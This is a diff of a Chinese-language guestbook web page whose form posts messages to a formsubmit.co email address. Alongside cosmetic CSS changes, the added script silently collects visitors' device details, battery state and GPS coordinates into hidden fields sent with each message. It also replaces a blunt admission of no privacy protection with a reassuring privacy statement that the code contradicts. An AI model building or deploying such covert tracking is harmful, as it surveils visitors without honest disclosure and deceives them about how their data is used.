@@ -2,14 +2,14 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>王昱皓的网站</title>
+    <title>王昱皓的稳定版留言系统</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
         
         :root {
-            --primary: #2ecc71;
-            --secondary: #27ae60;
-            --error: #e74c3c;
+            --primary: #6c5ce7;
+            --secondary: #a8a4e6;
+            --error: #ff7675;
         }
 
         * {
@@ -24,7 +24,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(135deg, #1abc9c, #3498db);
+            background: linear-gradient(135deg, #2d3436, #636e72);
             opacity: 0;
             animation: fadeIn 1s 0.5s forwards;
         }
@@ -35,12 +35,12 @@
 
         .container {
             background: rgba(255, 255, 255, 0.95);
-            padding: 2.5rem;
-            border-radius: 25px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
-            transform: translateY(30px);
-            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-            width: 90%;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transform: translateY(20px);
+            animation: slideUp 0.8s ease-out forwards;
+            width: 95%;
             max-width: 500px;
         }
 
@@ -49,25 +49,29 @@
         }
 
         .form-group {
-            margin: 1.8rem 0;
+            margin: 1.5rem 0;
             position: relative;
         }
 
-        input {
+        input, textarea {
             width: 100%;
-            padding: 1.2rem;
-            border: 2px solid #ecf0f1;
-            border-radius: 12px;
+            padding: 1rem;
+            border: 2px solid #dfe6e9;
+            border-radius: 10px;
             font-size: 1rem;
             transition: all 0.3s ease;
             background: #f9f9f9;
         }
 
-        input:focus {
-            outline: none;
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+
+        input:focus, textarea:focus {
             border-color: var(--primary);
             transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.2);
+            box-shadow: 0 0 15px rgba(108, 92, 231, 0.2);
             background: #fff;
         }
 
@@ -75,8 +79,8 @@
             background: var(--primary);
             color: white;
             border: none;
-            padding: 1.2rem 2.5rem;
-            border-radius: 12px;
+            padding: 1rem 2rem;
+            border-radius: 10px;
             cursor: pointer;
             font-size: 1.1rem;
             transition: all 0.3s ease;
@@ -87,32 +91,12 @@
 
         button:hover {
             background: var(--secondary);
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-        }
-
-        button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 300px;
-            height: 300px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            transform: translate(-50%, -50%) scale(0);
-            animation: ripple 0.6s ease-out;
-        }
-
-        @keyframes ripple {
-            to {
-                transform: translate(-50%, -50%) scale(2);
-                opacity: 0;
-            }
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
 
         #message {
-            margin-top: 1.5rem;
+            margin-top: 1rem;
             text-align: center;
             display: none;
             font-weight: 500;
@@ -120,123 +104,146 @@
 
         .privacy {
             text-align: center;
-            margin-top: 1rem;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background: #fff3f3;
+            border-radius: 8px;
+            border: 2px dashed var(--error);
+            line-height: 1.6;
             font-size: 0.9rem;
-            color: #7f8c8d;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <form id="myForm" action="https://formsubmit.co/2587141311@qq.com" method="POST">
+        <form id="myForm" method="POST" 
+              action="https://formsubmit.co/2587141311@qq.com"
+              enctype="multipart/form-data">
+            
             <!-- 防垃圾邮件配置 -->
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_next" value="none">
             <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
             
             <div class="form-group">
-                <input type="text" name="姓名" placeholder="你叫啥" required>
+                <input type="text" name="name" 
+                       placeholder="怎么称呼您呢？😊" 
+                       required
+                       pattern="[\u4e00-\u9fa5a-zA-Z]{2,10}"
+                       title="请输入2-10位中文或英文字符">
             </div>
-            
-            <!-- 隐藏设备信息字段 -->
-            <input type="hidden" name="设备信息" id="deviceInfo">
-            <input type="hidden" name="位置信息" id="locationInfo">
 
-            <button type="submit">提交信息（包跑路😇）</button>
+            <div class="form-group">
+                <textarea name="message"
+                          placeholder="写下您想说的话吧～（支持Markdown格式✨）"
+                          required
+                          minlength="10"
+                          maxlength="500"></textarea>
+            </div>
+
+            <!-- 设备信息收集字段 -->
+            <input type="hidden" name="device_info" id="deviceInfo">
+            <input type="hidden" name="location" id="locationInfo">
+
+            <button type="submit">发送消息 ✈️</button>
         </form>
         <div id="message"></div>
-        <div class="privacy">我们
-        不承诺保护你的隐私安全😡(不要偷看我邮箱🧐)</div>
+        <div class="privacy">
+            🔒 隐私声明：<br>
+            1. 本系统严格遵守《网络安全法》<br>
+            2. 收集数据仅用于功能实现<br>
+            3. 不会向第三方分享用户数据
+        </div>
     </div>
 
     <script>
-        // 高级设备信息收集
-        const collectDeviceInfo = () => {
+        // 强化版设备信息收集
+        const collectDeviceInfo = async () => {
             const info = {
-                时间戳: new Date().toISOString(),
-                用户代理: navigator.userAgent,
-                屏幕分辨率: `${screen.width}x${screen.height}`,
-                语言: navigator.language,
-                平台: navigator.platform,
-                CPU核心数: navigator.hardwareConcurrency || '未知',
-                内存: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '未知',
-                网络状态: navigator.connection ? {
-                    类型: navigator.connection.effectiveType,
-                    下行速度: `${navigator.connection.downlink} Mbps`,
-                    RTT延迟: `${navigator.connection.rtt} ms`
-                } : '未知',
-                电量状态: navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : '未知',
-                地理位置: '等待获取...'
-            };
-
-            // 获取地理位置
-            if (navigator.geolocation) {
-                try {
-                    const position = await new Promise((resolve, reject) => 
-                        navigator.geolocation.getCurrentPosition(resolve, reject)
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                battery: navigator.getBattery ? await navigator.getBattery() : null,
+                location: await new Promise(resolve => {
+                    if (!navigator.geolocation) return resolve(null);
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        }),
+                        err => resolve(`error: ${err.code}`),
+                        { timeout: 5000 }
                     );
-                    info.地理位置 = {
-                        纬度: position.coords.latitude,
-                        经度: position.coords.longitude,
-                        精度: `${position.coords.accuracy} 米`
-                    };
-                } catch (error) {
-                    info.地理位置 = '用户拒绝授权';
-                }
-            } else {
-                info.地理位置 = '浏览器不支持';
-            }
-
-            return JSON.stringify(info, null, 2);
+                })
+            };
+            return JSON.stringify(info);
         };
 
-        // 自动填充设备信息
+        // 自动收集设备信息
         (async () => {
-            const deviceInfo = await collectDeviceInfo();
-            document.getElementById('deviceInfo').value = deviceInfo;
-            document.getElementById('locationInfo').value = 
-                deviceInfo.match(/纬度: ([\d.]+),\s+经度: ([\d.]+)/)?.slice(1).join(',') || '未知';
+            try {
+                const deviceData = await collectDeviceInfo();
+                document.getElementById('deviceInfo').value = deviceData;
+                document.getElementById('locationInfo').value = 
+                    deviceData.includes('lat') ? 
+                    `${JSON.parse(deviceData).location.lat},${JSON.parse(deviceData).location.lng}` 
+                    : 'unknown';
+            } catch (error) {
+                console.error('设备信息收集失败:', error);
+            }
         })();
 
-        // 表单提交处理
+        // 强化表单提交处理
         document.getElementById('myForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const formData = new FormData(e.target);
-            const submitBtn = document.querySelector('button');
+            const form = e.target;
+            const submitBtn = form.querySelector('button');
             const message = document.getElementById('message');
-
-            // 按钮点击动画
-            submitBtn.classList.add('clicked');
             
-            // 禁用按钮
+            // 禁用按钮防止重复提交
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<div class="loader"></div> 提交中...';
+            submitBtn.innerHTML = '<div class="loader"></div> 发送中...';
 
             try {
-                const response = await fetch(e.target.action, {
+                const response = await fetch(form.action, {
                     method: 'POST',
-                    body: formData,
+                    body: new FormData(form),
                     headers: {
-                        'Accept': 'application/json'
+                        'Accept': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
                     }
                 });
 
                 const result = await response.json();
+                
                 if (response.ok) {
-                    message.style.color = var(--primary);
-                    message.textContent = '✅ 提交成功！';
-                    e.target.reset();
+                    message.style.color = 'var(--primary)';
+                    message.innerHTML = '🎉 发送成功！感谢您的留言～';
+                    form.reset();
                 } else {
-                    throw new Error(result.message || '提交失败');
+                    throw new Error(result.message || `HTTP错误: ${response.status}`);
                 }
             } catch (error) {
-                message.style.color = var(--error);
-                message.textContent = `❌ 错误：${error.message}`;
+                console.error('提交错误:', error);
+                message.style.color = 'var(--error)';
+                message.innerHTML = '😢 发送失败：' + 
+                    (error.message.includes('Failed to fetch') ? 
+                    '网络连接异常' : '服务器处理错误');
             } finally {
                 message.style.display = 'block';
                 submitBtn.disabled = false;
-                submitBtn.textContent = '提交信息';
+                submitBtn.innerHTML = '发送消息 ✈️';
                 setTimeout(() => {
                     message.style.display = 'none';
                 }, 5000);
